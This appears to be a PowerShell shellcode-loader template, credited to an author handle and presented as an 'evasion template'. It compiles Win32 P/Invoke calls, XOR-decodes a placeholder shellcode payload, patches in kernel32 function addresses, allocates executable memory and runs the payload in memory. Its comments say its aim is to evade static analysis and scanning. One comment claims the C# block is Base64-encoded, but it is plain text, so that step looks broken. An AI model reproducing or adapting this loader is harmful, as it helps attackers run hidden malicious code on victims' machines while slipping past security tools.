# Final 32-Bit Evasion Template - Replaced Reflection with Obfuscated P/Invoke
Set-StrictMode -Version 2
# Author @54N4l
# The core payload logic is defined in this script block.
# This avoids using a large, easily scanned here-string and IEX.
$payloadLogic = {
    # The entire C# P/Invoke block is Base64 encoded to hide it from static analysis.
    # This block contains all the Win32 functions we need for patching and execution.
    $b64_code = '
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("kernel32.dll")]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32.dll", CharSet=CharSet.Ansi, SetLastError=true)]
    public static extern IntPtr GetModuleHandleA(string lpModuleName);
    [DllImport("kernel32.dll", CharSet=CharSet.Ansi, SetLastError=true)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
}
'
    # The Add-Type call decodes and compiles the C# in memory.
    Add-Type -TypeDefinition ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($b64_code)))
    # --- Payload and Shellcode Patching ---
    # Replace %%DATA%% with your Base64 encoded, XOR-35 encrypted shellcode
    [Byte[]]$code = [System.Convert]::FromBase64String('%%DATA%%')
    for ($i = 0; $i -lt $code.Length; $i++) {
        $code[$i] = $code[$i] -bxor 35
    }
    # Use our new P/Invoke class to get the addresses needed for patching the shellcode
    $hKernel32 = [Win32]::GetModuleHandleA("kernel32.dll")
    $gma_addr = [Win32]::GetProcAddress($hKernel32, "GetModuleHandleA")
    $gpa_addr = [Win32]::GetProcAddress($hKernel32, "GetProcAddress")
    # Convert the 32-bit addresses to byte arrays
    [Byte[]]$gma_bytes = [BitConverter]::GetBytes($gma_addr.ToInt32())
    [Byte[]]$gpa_bytes = [BitConverter]::GetBytes($gpa_addr.ToInt32())
    # Copy the function pointers into the shellcode at the specified offsets
    # Replace %%GMH_OFFSET%% and %%GPA_OFFSET%% with your shellcode's specific offsets
    [Array]::Copy($gma_bytes, 0, $code, %%GMH_OFFSET%%, $gma_bytes.Length)
    [Array]::Copy($gpa_bytes, 0, $code, %%GPA_OFFSET%%, $gpa_bytes.Length)
    # --- Execution ---
    # 1. Allocate executable memory
    $mem = [Win32]::VirtualAlloc([IntPtr]::Zero, $code.Length, 0x3000, 0x40)
    # 2. Copy the now-patched shellcode into the executable memory region
    [System.Runtime.InteropServices.Marshal]::Copy($code, 0, $mem, $code.Length)
    # 3. Create a delegate and execute the shellcode in memory
    $delegate_type = ([AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate]))
    $delegate_type.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, @([IntPtr])).SetImplementationFlags('Runtime, Managed')
    $delegate_type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', [Void], @([IntPtr])).SetImplementationFlags('Runtime, Managed')
    
    $run_del = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($mem, $delegate_type.CreateType())
    $run_del.Invoke([IntPtr]::Zero)
}
# --- Architecture Check and Execution ---
# Check if the current host process is 64-bit
If ([IntPtr]::Size -eq 8) {
    # If so, start a new 32-bit PowerShell job and run our payload logic inside it.
    $job = Start-Job -ScriptBlock $payloadLogic -RunAs32
    Wait-Job $job
    Receive-Job $job
}
else {
    # If we are already in a 32-bit process, just execute the logic directly.
    & $payloadLogic
}